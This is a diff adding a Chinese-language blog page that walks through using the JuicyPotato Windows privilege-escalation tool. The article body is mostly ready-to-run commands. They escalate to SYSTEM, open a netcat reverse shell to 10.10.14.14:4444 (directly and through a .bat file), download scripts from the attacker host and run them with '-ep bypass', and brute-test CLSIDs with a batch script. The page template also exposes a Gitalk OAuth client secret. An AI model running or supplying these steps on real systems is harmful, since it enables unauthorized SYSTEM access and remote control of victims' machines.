@@ -1,0 +1,378 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>JuicyPotato提权 | Twe1ve&#39;s Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
+  <meta name="description" content="项目地址：https:&#x2F;&#x2F;github.com&#x2F;ohpe&#x2F;juicy-potato&#x2F; 0x01、前言Juicy Potato是在工具RottenPotatoNG （ms16-075提权exe）的基础上的扩展，使用更方便，使用范围也更广，利用的前提是获得了SeImpersonate或者SeAssignPrimaryToken权限，通常在webshell下使用 whoami &#x2F;pri   ##查找Se">
+<meta property="og:type" content="article">
+<meta property="og:title" content="JuicyPotato提权">
+<meta property="og:url" content="https://github.com/Twe1ve-web/Twe1ve-web.github.io/2020/04/22/JuicyPotato%E6%8F%90%E6%9D%83/index.html">
+<meta property="og:site_name" content="Twe1ve&#39;s Blog">
+<meta property="og:description" content="项目地址：https:&#x2F;&#x2F;github.com&#x2F;ohpe&#x2F;juicy-potato&#x2F; 0x01、前言Juicy Potato是在工具RottenPotatoNG （ms16-075提权exe）的基础上的扩展，使用更方便，使用范围也更广，利用的前提是获得了SeImpersonate或者SeAssignPrimaryToken权限，通常在webshell下使用 whoami &#x2F;pri   ##查找Se">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://github.com/images/juicyoptato1.jpg">
+<meta property="og:image" content="https://github.com/images/juicyoptato2.jpg">
+<meta property="article:published_time" content="2020-04-22T06:52:56.000Z">
+<meta property="article:modified_time" content="2020-04-22T07:02:07.011Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://github.com/images/juicyoptato1.jpg">
+  
+    <link rel="icon" href="/images/icon.png">
+  
+  
+<link rel="stylesheet" href="/css/index.css">
+
+
+
+  <!-- 百度站長統計-->
+  
+  <script>
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?f4e4f3d9d2532faa71e451f2ab41cbb6";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+  
+<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="Twe1ve's Blog" type="application/atom+xml">
+</head>
+
+<div class="main height-100 flex flex-v">
+  <div class="phone-header">
+    <a to="/home" class="mobile-logo" > <img src="/images/logo.svg" /> </a>
+    <a class="menu iconfont icon-menu" onclick="toggleMenu()"></a>
+  </div>
+  <div class="main-top flex flex1">
+    <nuxt-link  to="/home" class="mobile-nav-btn iconfont icon-fenlei"></nuxt-link>
+    <!--主页上左部分-->
+    <div class="height-100 main-left  flex flex-v">
+      <div class="main-left-top flex1">
+        <a class="logo">
+          <img src="/images/logo.svg" />
+          <div class="sub-title">废物Twe1ve的垃圾展示台</div>
+        </a>
+        <nav class="nav">
+
+  
+    
+      <a title="首页"  alt="首页"  v-for="(menu,index) in menus" href="/">
+        <div class="icon"><i class="iconfont icon-home"></i></div>
+        <div class="name">
+          <div class="cnname">首页</div>
+          <div class="enname">Home Page</div>
+        </div>
+      </a>
+
+    
+      <a title="归档"  alt="归档"  v-for="(menu,index) in menus" href="/archives">
+        <div class="icon"><i class="iconfont icon-archives"></i></div>
+        <div class="name">
+          <div class="cnname">归档</div>
+          <div class="enname">Archive Page</div>
+        </div>
+      </a>
+
+    
+      <a title="关于我"  alt="关于我"  v-for="(menu,index) in menus" href="./../about">
+        <div class="icon"><i class="iconfont icon-about"></i></div>
+        <div class="name">
+          <div class="cnname">关于我</div>
+          <div class="enname">About Me</div>
+        </div>
+      </a>
+
+    
+  
+
+  <!--<a href="/link/">
+    <div class="icon"><i class="iconfont icon-link"></i></div>
+    <div class="name">
+      <div class="cnname">友情链接</div>
+      <div class="enname">Friends Web Link</div>
+    </div>
+  </a>-->
+</nav>
+
+      </div>
+
+      <view class="website-msg">
+        <div class="beian"><a target="_blank" href="http://www.miitbeian.gov.cn/"></a></div>
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        <div class="beian"><span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span></div>
+        <!--
+        <div class="theme-drsc">PowerBy:<a href="https://hexo.io" target="_blank">Hexo</a> ThemeBy:<a href="" target="_blank">Soul</a></div>
+        -->
+        <div class="copyright">Copyright &#169 <a href="mailto:yorojogame@gmail.com">2020 Twe1ve&#39;s Blog</a> </div>
+      </view>
+
+      <div class="social flex flex-align-center ">
+        
+          
+            
+          
+        
+      </div>
+    </div>
+    <!--主页上右部分-->
+    <div class="main-right flex1 flex flex-v">
+    <div class="article-content flex1">
+        <div class="article-content-container">
+            <div class="article-title row">
+                <div class="title">JuicyPotato提权</div>
+                <div class=" other">
+                    <!--<i class="iconfont icon-iconfontordinaryliulan"></i> 56--> <i
+                        class="iconfont icon-shijian"></i>· Apr 22, 2020 ·</div>
+            </div>
+            <div class="article-message markdown-body">
+                <article class="text" v-highlight>
+                    <p>项目地址：<a href="https://github.com/ohpe/juicy-potato/">https://github.com/ohpe/juicy-potato/</a></p>
+<h1 id="0x01、前言"><a href="#0x01、前言" class="headerlink" title="0x01、前言"></a>0x01、前言</h1><p>Juicy Potato是在工具RottenPotatoNG （ms16-075提权exe）的基础上的扩展，使用更方便，使用范围也更广，<br>利用的前提是获得了SeImpersonate或者SeAssignPrimaryToken权限，通常在webshell下使用</p>
+<p>whoami /pri   ##查找SeImpersonate and/or SeAssignPrimaryToken</p>
+<p><img src="/images/juicyoptato1.jpg" alt="alt"></p>
+<h1 id="0x02、JuicyPotato功能"><a href="#0x02、JuicyPotato功能" class="headerlink" title="0x02、JuicyPotato功能"></a>0x02、JuicyPotato功能</h1><p><strong>自主选择CLSID</strong></p>
+<p>-c ‘clsid’         #### clsid查找：<a href="http://ohpe.it/juicy-potato/CLSID/" target="_blank" rel="noopener">http://ohpe.it/juicy-potato/CLSID/</a> </p>
+<p><strong>自定义COM监听端口</strong></p>
+<p>-l <port>: COM server listen port</port></p>
+<p><strong>COM监听地址</strong></p>
+<p>-m <ip>: COM server listen address (default 127.0.0.1)</ip></p>
+<p><strong>进程创建模块</strong> </p>
+<p>-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, &lt;*&gt; try both</u></t></p>
+<p><strong>执行指定进程或脚本</strong></p>
+<p>-p <program>: program to launch</program></p>
+<p><strong>为指定的执行进程选择参数</strong></p>
+<p>-a <argument>: command line argument to pass to program (default NULL)</argument></p>
+<p><strong>RPC服务地址</strong></p>
+<p>-k <ip>: RPC server ip address (default 127.0.0.1)</ip></p>
+<p><strong>RPC服务端口：</strong></p>
+<p>-n <port>: RPC server listen port (default 135)</port></p>
+<p><strong>支持测试模块；测试并查找clsid</strong></p>
+<p>-z only test CLSID and print token’s user</p>
+<h1 id="0x03、JuicyPotato使用"><a href="#0x03、JuicyPotato使用" class="headerlink" title="0x03、JuicyPotato使用"></a>0x03、JuicyPotato使用</h1><h2 id="依赖于clsid："><a href="#依赖于clsid：" class="headerlink" title="依赖于clsid："></a>依赖于clsid：</h2><pre><code>PS C:\users\userpool\desktop&gt; ./juicypotato.exe  -l 1337 -p c:\windows\system32\cmd.exe -a &quot;/c whoami&quot; -t *
+Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
+COM -&gt; recv failed with error: 10038</code></pre><p>查找替换<a href="http://ohpe.it/juicy-potato/CLSID/" target="_blank" rel="noopener">http://ohpe.it/juicy-potato/CLSID/</a>  很幸运2012 Standard中的第一条就成功了：</p>
+<pre><code>./juicypotato.exe  -l 1337 -p c:\windows\system32\cmd.exe -a &quot;whoami&quot; -t * -c &apos;{e60687f7-01a1-40aa-86ac-db1cbf673334}&apos;</code></pre><p><img src="/images/juicyoptato2.jpg" alt="alt"></p>
+<h2 id="反弹shell："><a href="#反弹shell：" class="headerlink" title="反弹shell："></a>反弹shell：</h2><pre><code>./juicypotato.exe  -l 1337 -p c:\windows\system32\cmd.exe -a &quot;/c c:\users\userpool\desktop\nc.exe -e cmd.exe 10.10.14.14 4444&quot; -t * -c &apos;{e60687f7-01a1-40aa-86ac-db1cbf673334}&apos;</code></pre><p>或者将paylaod写入bat，-p参数执行bat</p>
+<pre><code>echo &apos;C:\users\userpool\nc.exe -e cmd.exe 10.10.14.14 4444&apos; &gt; rev.bat
+./juicypotato.exe  -l 1337 -p c:\users\userpool\desktop\rev.bat -t * -c &apos;{e60687f7-01a1-40aa-86ac-db1cbf673334}&apos;</code></pre><p>RDP下提权：直接弹出一个system权限窗口</p>
+<pre><code>./juicypotato.exe  -l 1337 -p c:\windows\system32\cmd.exe  -t * -c &apos;{e60687f7-01a1-40aa-86ac-db1cbf673334}&apos;</code></pre><h1 id="0x04、CLSID快速验证"><a href="#0x04、CLSID快速验证" class="headerlink" title="0x04、CLSID快速验证"></a>0x04、CLSID快速验证</h1><p><strong>[1]获取可用CLSID列表</strong></p>
+<p><a href="https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1">提取CLSID Powershell脚本 GetCLSID.ps1</a></p>
+<p><a href="https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1">同级目录下需要有Join-Object.ps1</a></p>
+<p>GetCLSID.ps1执行成功后生成文件CLSID.list和CLSID.csv(在windows对应版本的目录下，如Windows_Server_2012_R2_Datacenter)</p>
+<pre><code>Invoke-WebRequest -Uri http://10.10.14.14:8000/Join-Object.ps1 -outfile ./Join-Object.ps1
+Invoke-WebRequest -Uri http://10.10.14.14:8000/GetCLSID.ps1 -outfile ./GetCLSID.ps1
+powershell -ep bypass -f GetCLSID.ps1
+##Get-Content GetCLSID.ps1 | PowerShell.exe -noprofile -</code></pre><p><strong>枚举所有满足条件的CLSID:</strong></p>
+<pre><code>New-PSDrive -Name HKCR -PSProvider Registry -Root HKEY_CLASSES_ROOT | Out-Null
+$CLSID = Get-ItemProperty HKCR:\clsid\* | select-object AppID,@{N=&apos;CLSID&apos;; E={$_.pschildname}} | where-object {$_.appid -ne $null}
+foreach($a in $CLSID)
+{
+Write-Host $a.CLSID
+}</code></pre><p>[2]批处理调用juicypotato.exe逐个测试CLSID</p>
+<p>test_clsid.bat:</p>
+<pre><code>@echo off
+:: Starting port, you can change it
+set /a port=10000
+SETLOCAL ENABLEDELAYEDEXPANSION
+FOR /F %%i IN (CLSID.list) DO (
+   echo %%i !port!
+   juicypotato.exe -z -l !port! -c %%i &gt;&gt; result.log
+   set RET=!ERRORLEVEL!
+   :: echo !RET!
+   if &quot;!RET!&quot; == &quot;1&quot;  set /a port=port+1
+)</code></pre><h1 id="0x05、限制条件"><a href="#0x05、限制条件" class="headerlink" title="0x05、限制条件"></a>0x05、限制条件</h1><ul>
+<li>需要支持SeImpersonate或者SeAssignPrimaryToken权限</li>
+<li>开启DCOM</li>
+<li>本地支持RPC或者远程服务器支持PRC并能成功登录</li>
+<li>能够找到可用的COM对象</li>
+</ul>
+<p><a href="https://3gstudent.github.io/3gstudent.github.io/Windows%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%B7%A5%E5%85%B7Juicy-Potato%E6%B5%8B%E8%AF%95%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">https://3gstudent.github.io/3gstudent.github.io/Windows%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%B7%A5%E5%85%B7Juicy-Potato%E6%B5%8B%E8%AF%95%E5%88%86%E6%9E%90/</a></p>
+
+                </article>
+            </div>
+            <div id="gitalk-container"></div>
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<style>
+    .hljs {
+        display: block !important;
+        overflow-x: auto !important;
+        background: #2b2b2b !important;
+        color: #f8f8f2 !important;
+        padding: .5em !important;
+    }
+</style>
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<script>
+    var gitalk = new Gitalk({
+        clientID: '85810192d72d7f763a9a',
+        clientSecret: 'e9867192041e53ad9f4581db6e50bbe7373a090d',
+        repo: 'myblog',
+        owner: 'callmesoul',
+        admin: ['callmesoul'],
+        id: '', // Ensure uniqueness and length less than 50
+        distractionFreeMode: false // Facebook-like distraction free mode
+    })
+    gitalk.render('gitalk-container')
+</script>
+        </div>
+    </div>
+</div>
+
+<link href="https://cdn.bootcss.com/highlight.js/9.15.7/styles/a11y-dark.min.css" rel="stylesheet">
+<script src="https://cdn.bootcss.com/highlight.js/9.15.9/highlight.min.js"></script>
+<script>
+    document.addEventListener('DOMContentLoaded', (event) => {
+        document.querySelectorAll('pre code').forEach((block) => {
+            hljs.highlightBlock(block);
+        });
+    });
+</script>
+  </div>
+  <!--
+  <div class="main-bottom">
+    <div class="music flex flex-pack-justify flex-align-center">
+      <div class="control">
+        <a onclick="preSong()"><span class="iconfont icon-shangyishou"></span></a>
+        <a onclick="playControl()"><span class="iconfont play-icon icon-kaishi1"></span></a>
+        <a onclick="nextSong()"><span class="iconfont icon-xiayishou-copy"></span></a>
+      </div>
+      <div class="msg">
+        <span class="time"></span>
+        <div class="line" ref="progress-line-warp">
+          <div class="song-msg">周杰伦 - 说好不哭</div>
+          <!--<div class="current-line" ref="progress-line">
+            <a tag="a" class="target" v-on:mousedown.prevent="mousedown"></a>
+          </div>-->
+        </div>
+        <span class="all-time"></span>
+      </div>
+      <div class="right-control">
+        <a class="order-btn flex flex-align-center" onclick="toogleShowMusicList()">
+          <span class="iconfont icon-ttpodicon"></span>
+          <span class="number flex1">3</span>
+        </a>
+      </div>
+      <audio id="audio" class="mian-audio" src="https://callmesoul-blog.oss-cn-shenzhen.aliyuncs.com/music/%E5%91%A8%E6%9D%B0%E4%BC%A6%20-%20%E8%AF%B4%E5%A5%BD%E4%B8%8D%E5%93%AD.mp3">
+        Your browser does not support the audio element.
+      </audio>
+    </div>
+  </div>
+  <div class="music-list">
+    <div id="musiclist">
+      
+        <a class="music-item flex flex-align-center" data-name="周杰伦 - 说好不哭" data-url="https://callmesoul-blog.oss-cn-shenzhen.aliyuncs.com/music/%E5%91%A8%E6%9D%B0%E4%BC%A6%20-%20%E8%AF%B4%E5%A5%BD%E4%B8%8D%E5%93%AD.mp3" onclick="changePlayIndex(0)" >
+          <span class="iconfont" class="icon-kaishi"></span>
+          <span class="title flex1">说好不哭 - 周杰伦</span>
+        </a>
+      
+        <a class="music-item flex flex-align-center" data-name="周杰伦 - 爱在西元前" data-url="https://callmesoul-blog.oss-cn-shenzhen.aliyuncs.com/music/%E5%91%A8%E6%9D%B0%E4%BC%A6%20-%20%E7%88%B1%E5%9C%A8%E8%A5%BF%E5%85%83%E5%89%8D%20%5Bmqms2%5D.mp3" onclick="changePlayIndex(1)" >
+          <span class="iconfont" class="icon-kaishi"></span>
+          <span class="title flex1">爱在西元前 - 周杰伦</span>
+        </a>
+      
+        <a class="music-item flex flex-align-center" data-name="周杰伦 - 龙拳" data-url="https://callmesoul-blog.oss-cn-shenzhen.aliyuncs.com/music/%E5%91%A8%E6%9D%B0%E4%BC%A6%20-%20%E9%BE%99%E6%8B%B3%20%5Bmqms2%5D.mp3" onclick="changePlayIndex(2)" >
+          <span class="iconfont" class="icon-kaishi"></span>
+          <span class="title flex1">龙拳 - 周杰伦</span>
+        </a>
+      
+    </div>
+  </div>
+</div>
+
+<script>
+  var playIndex = localStorage.getItem('playIndex') ? parseInt(localStorage.getItem('playIndex')) : 0
+  let musics = $('.music-item')
+  musics.eq(playIndex).addClass('active')
+  var audio = document.getElementById("audio");
+
+  $('.song-msg').html(musics[playIndex].dataset.name)
+  audio.src = musics[playIndex].dataset.url
+
+
+  var playbtn = document.getElementsByClassName("play-icon")[0];
+  var playing = false;
+  audio.loop = false;
+  audio.addEventListener('ended', function () {
+    playbtn.classList.remove("icon-kaishi")
+    playbtn.classList.add("icon-kaishi1")
+    playing = false
+  }, false);
+  audio.addEventListener('play', function () {
+    playbtn.classList.remove("icon-kaishi1")
+    playbtn.classList.add("icon-kaishi")
+    playing= true
+  }, false);
+  audio.addEventListener('pause', function () {
+    playbtn.classList.remove("icon-kaishi")
+    playbtn.classList.add("icon-kaishi1")
+    playing = false
+  }, false);
+  function toogleShowMusicList() {
+    var musiclist = document.getElementsByClassName("music-list")[0];
+    if(musiclist.className.indexOf("active") === -1){
+      musiclist.classList.add("active")
+    }else{
+      musiclist.classList.remove("active");
+    }
+  }
+
+  function playControl() {
+    if(playing){
+      audio.pause()
+    }else{
+      audio.play()
+    }
+  }
+
+  function changePlayIndex(index) {
+    if(playIndex !== index){
+      localStorage.setItem('playIndex',index)
+      playIndex = index
+      musics.removeClass('active')
+      musics.eq(playIndex).addClass('active')
+      $('.song-msg').html(musics[playIndex].dataset.name)
+      audio.src = musics[playIndex].dataset.url
+      audio.play()
+    }else{
+      playControl()
+    }
+  }
+
+  function preSong() {
+    var index
+    if(playIndex === 0){
+      index = musics.length - 1
+    }else{
+      index = playIndex - 1
+    }
+    changePlayIndex(index)
+  }
+
+  function nextSong() {
+    var index
+    if(playIndex === musics.length - 1){
+      index = 0
+    }else{
+      index = playIndex + 1
+    }
+    changePlayIndex(index)
+  }
+-->
+  function toggleMenu() {
+    var mainLeft = $('.main-left')
+    if(mainLeft.hasClass('active')){
+      mainLeft.removeClass('active')
+      $('.menu').removeClass('icon-close')
+      $('.menu').addClass('icon-menu')
+    }else{
+      mainLeft.addClass('active')
+      $('.menu').removeClass('icon-menu')
+      $('.menu').addClass('icon-close')
+    }
+  }
+</script>
